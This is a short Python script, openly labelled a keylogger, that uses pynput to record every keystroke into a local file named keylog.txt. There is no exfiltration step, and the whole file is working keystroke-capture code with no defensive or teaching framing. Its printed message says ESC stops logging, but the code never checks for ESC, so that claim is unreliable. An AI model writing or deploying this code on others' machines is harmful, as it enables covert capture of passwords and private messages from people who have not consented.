from pynput import keyboard

LOG_FILE = "keylog.txt"

def on_press(key):
    try:
        with open(LOG_FILE, "a") as f:
            f.write(f"{key.char}")
    except AttributeError:
        # Special keys (space, enter, etc.)
        with open(LOG_FILE, "a") as f:
            f.write(f"[{key.name}]")

def main():
    print("🔴 Keylogger is running... (Press ESC to stop)")

    # Start listening
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
